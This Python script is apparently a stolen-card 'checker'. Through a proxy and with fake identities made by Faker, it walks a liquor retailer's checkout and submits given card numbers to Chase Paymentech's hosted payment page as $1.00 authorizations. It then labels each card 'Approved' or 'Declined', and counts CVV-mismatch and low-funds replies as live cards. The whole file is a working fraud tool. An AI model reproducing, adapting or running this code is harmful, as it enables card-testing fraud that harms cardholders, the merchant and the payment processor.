import requests
import uuid
from faker import Faker
import urllib.parse
from httpx import AsyncClient


async def chaseccnauth(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False,proxy=proxyg) as web:
        fake = Faker()
        email = str(uuid.uuid4()) + '@gmail.com'

        try:
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'priority': 'u=1, i',
                'referer': 'https://www.harleysliquor.com/cart',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'x-cc-meteringmode': 'CC-NonMetered',
                'x-ccpricelistgroup': 'store20',
                'x-ccprofiletype': 'storefrontUI',
                'x-ccsite': '100001',
                'x-ccviewport': 'xs',
                'x-ccvisitid': '4ddc2607:194963cca1f:-7ec1-4094316551',
                'x-ccvisitorid': '13ABP_uJByQ_Y8mEI7iY9kGl8V0fo18vSKc7B6bavWIr6yQ923B',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'ccvp': 'xs',
            }

            req2 = await web.get('https://www.harleysliquor.com/ccstoreui/v1/pages/layout/cart', params=params, headers=headers)

            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'priority': 'u=1, i',
                'referer': 'https://www.harleysliquor.com/checkout',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'x-cc-meteringmode': 'CC-NonMetered',
                'x-ccpricelistgroup': 'store20',
                'x-ccprofiletype': 'storefrontUI',
                'x-ccsite': '100001',
                'x-ccviewport': 'xs',
                'x-ccvisitid': '4ddc2607:194963cca1f:-7ec1-4094316551',
                'x-ccvisitorid': '13ABP_uJByQ_Y8mEI7iY9kGl8V0fo18vSKc7B6bavWIr6yQ923B',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'ccvp': 'xs',
            }

            req3 = await web.get('https://www.harleysliquor.com/ccstoreui/v1/pages/layout/checkout', params=params, headers=headers)

            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://www.harleysliquor.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://www.harleysliquor.com/checkout',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            json_data = {
                'email': email,
            }

            req4 = await web.post('https://www.harleysliquor.com/ccstorex/custom/emailValidation',headers=headers,json=json_data)

            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://www.harleysliquor.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://www.harleysliquor.com/checkout',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'x-cc-meteringmode': 'CC-NonMetered',
                'x-ccpricelistgroup': 'store20',
                'x-ccprofiletype': 'storefrontUI',
                'x-ccsite': '100001',
                'x-ccviewport': 'xs',
                'x-ccvisitid': '4ddc2607:194963cca1f:-7ec1-4094316551',
                'x-ccvisitorid': '13ABP_uJByQ_Y8mEI7iY9kGl8V0fo18vSKc7B6bavWIr6yQ923B',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = '{"shoppingCart":{"items":[{"productId":"41625","quantity":1,"repositoryId":"ci231097175","availabilityDate":null,"catRefId":"41625","expanded":false,"stockStatus":true,"stockState":"IN_STOCK","orderableQuantityMessage":"","commerceItemQuantity":1,"orderableQuantity":999999999999,"soldAsPackage":true,"assetable":false,"shippable":true,"allowVirtualShippingGroup":true,"isVirtualShippingGroup":false,"selectedOptions":[],"selectedSkuProperties":[],"discountInfo":[],"rawTotalPrice":19.99,"detailedItemPriceInfo":[{"discounted":false,"secondaryCurrencyTaxAmount":0,"amount":19.99,"quantity":1,"configurationDiscountShare":0,"tax":1.65,"orderDiscountShare":0,"detailedUnitPrice":19.99,"currencyCode":"USD"}],"externalData":[],"addOnItem":false,"displayName":"","invalid":false,"commerceItemId":"ci11991766007381","priceListGroupId":"store20","giftWithPurchaseCommerceItemMarkers":[],"eGift_Message":null,"eGift_RecipientEmail":null,"eGift_RecipientName":null,"eGift_YourName":null,"price":19.99},{"productId":"999999","quantity":1,"repositoryId":"ci231097176","availabilityDate":null,"catRefId":"999999","expanded":false,"stockStatus":true,"stockState":"","commerceItemQuantity":1,"soldAsPackage":true,"assetable":false,"shippable":false,"allowVirtualShippingGroup":true,"isVirtualShippingGroup":true,"selectedOptions":[],"discountInfo":[],"rawTotalPrice":0,"detailedItemPriceInfo":[{"discounted":false,"secondaryCurrencyTaxAmount":0,"amount":0,"quantity":1,"configurationDiscountShare":0,"tax":0,"orderDiscountShare":0,"detailedUnitPrice":0,"currencyCode":"USD"}],"externalPrice":"0.00","externalPriceQuantity":-1,"externalData":[],"addOnItem":false,"eGift_Message":null,"eGift_RecipientEmail":null,"eGift_RecipientName":null,"eGift_YourName":null,"displayName":"Tip","invalid":false,"commerceItemId":"ci18096776041752","priceListGroupId":"store20","giftWithPurchaseCommerceItemMarkers":[],"price":0}],"coupons":[]},"combineLineItems":"yes","payments":[],"GG_bottleClubPhoneNumber":null,"user_Agent_String":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","GG_deliveryInstructions":null,"GG_deliveryCarrier":"","GG_MaxPointsAvailable":null,"GG_bottleClub_Points":null,"GG_deliveryDateTime":"","payPal_Payment":"false","GG_pickupStoreNumber":"20","GG_bottleClubUID":null,"GG_bottleClubPointsApplied":null,"GG_GiftCardAmountApplied":"0","GG_payInStorePickupName":null,"gift_message":null,"GG_bottleClubAccountNumber":null,"GG_orderComments":null,"GG_orderLookupQRCode":null,"Electronic_Items_Only":"false","GG_bopisTip":"0.00","GG_payInStorePickupNumber":null,"GG_pickUpDate":"2025-01-31T10:00:00Z","GG_pickUpType":"IN-STORE PICKUP","shippingMethod":{"value":"sm10001"},"shippingAddress":{"alias":"","prefix":"","firstName":"Longview - W. Marshall","middleName":"","lastName":"-","suffix":"","country":"United States","postalCode":"75604","address1":"1401 W. Marshall Ave","address2":"","address3":"","city":"Longview","state":"Texas","county":"","phoneNumber":"903 475-1677","email":"juasnadn@gmail.com","jobTitle":"","companyName":"","faxNumber":"","type":"","repositoryId":"","isDefaultBillingAddress":false,"isDefaultShippingAddress":false,"predefinedAddressTypes":[],"isTypeModified":false,"computedDefaultBilling":false,"computedDefaultShipping":false,"selectedCountry":"US","selectedState":"TX","state_ISOCode":"US-TX","defaultCountryCode":"US","selectedAddressTypes":[],"isDefaultAddress":false,"phoneNumberMask":"1-000-000-0000","phoneNumberMasked":"1-903-475-1677","types":[]},"populateShippingMethods":true,"checkout":true}'
            
            req5 = await web.post('https://www.harleysliquor.com/ccstoreui/v1/orders/price',headers=headers,data=data)

            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'multipart/form-data; boundary=something',
                'origin': 'https://www.harleysliquor.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://www.harleysliquor.com/checkout',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            req6 = await web.post(f'https://www.harleysliquor.com/ccstorex/custom/v1/gg-sse-uid?name={fake.name().replace(" ", "%20")}&customer_phone={fake.phone_number().replace(" ", "")}&address={urllib.parse.quote(fake.address().replace("\\n", " "))}&city={urllib.parse.quote(fake.city())}&state={fake.state_abbr()}&postal_code={fake.zipcode()}&country={urllib.parse.quote(fake.country())}&customer_email={email}', headers=headers)
            try:
                uID = req6.text.split('uID=')[1].split('"')[0]
                print(uID)
            except IndexError:
                return "Declined ❌", "Error scrapeando uID (Sitio muerto o mal proxy)"

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'referer': 'https://www.harleysliquor.com/',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'iframe',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            params = {
                'uID': uID,
            }

            req7 = await web.get('https://www.chasepaymentechhostedpay.com/hpf/1_1/', params=params, headers=headers)

            try:
                tracer = req7.text.split('id="tracer" name="tracer" value="')[1].split('"')[0]
                sid = req7.text.split('id="sid" name="sid" value="')[1].split('"')[0]
            except IndexError:
                return "Declined ❌", "Error scrapeando tracer/sid"
            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.chasepaymentechhostedpay.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': f'https://www.chasepaymentechhostedpay.com/hpf/1_1/?uID={uID}',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            data = {
                'action': 'init',
                'sid': sid,
            }

            req8 = await web.post('https://www.chasepaymentechhostedpay.com/hpf/1_1/iframeprocessor.php', headers=headers, data=data)
            try:
                tracer = req8.text.split('"tracer":"')[1].split('"')[0]
            except IndexError:
                return "Declined ❌", "Error obteniendo tracer final"
            
            one = cc[0:1]
            if one == "4":
                cc_type = "Visa"
            elif one == "5":
                cc_type = "MasterCard"
            elif one == "3":
                cc_type = "AmericanExpress"
            elif one == "6":
                cc_type = "Discover"
            
            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.chasepaymentechhostedpay.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': f'https://www.chasepaymentechhostedpay.com/hpf/1_1/?uID={uID}',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            data = [
                ('lang', 'en_US'),
                ('sessionId', '123456'),
                ('amount', '1.00'),
                ('required', 'all'),
                ('uIDTrans', '1'),
                ('tdsApproved', ''),
                ('tracer', tracer),
                ('completeStatus', '0'),
                ('sid', sid),
                ('currency_code', 'USD'),
                ('cbOverride', ''),
                ('name', fake.first_name()),
                ('ccType', cc_type),
                ('ccNumber', cc),
                ('CVV2', '%%%$%%%'),
                ('expMonth', mes),
                ('expYear', ano),
                ('action', 'process'),
                ('sid', sid),
            ]
            data = dict(data)
            req9 = await web.post('https://www.chasepaymentechhostedpay.com/hpf/1_1/iframeprocessor.php', headers=headers, data=data)
            if '"message":"Success"' in req9.text:
                status = 'Approved ✅'
                mensaje = 'Approved'
            else:
                try:
                    mensaje = req9.text.split('"gatewayMessage":"')[1].split('"')[0]
                except IndexError:
                    mensaje = "Gateway Message no encontrado en la respuesta."
                mensaje = urllib.parse.unquote(mensaje)
                if "+" in mensaje:
                    mensaje = mensaje.replace("+", " ")
                if 'CVV2' in mensaje:
                    status = "Approved ✅"
                elif 'Credit Floor' in mensaje or 'Funds' in mensaje:
                    status = "Approved ✅"
                else:
                    status = "Declined ❌"
        except Exception as e:
            status = "Error ⚠️"
            mensaje = f"Error en la línea {e.__traceback__.tb_lineno}"
        return status, mensaje
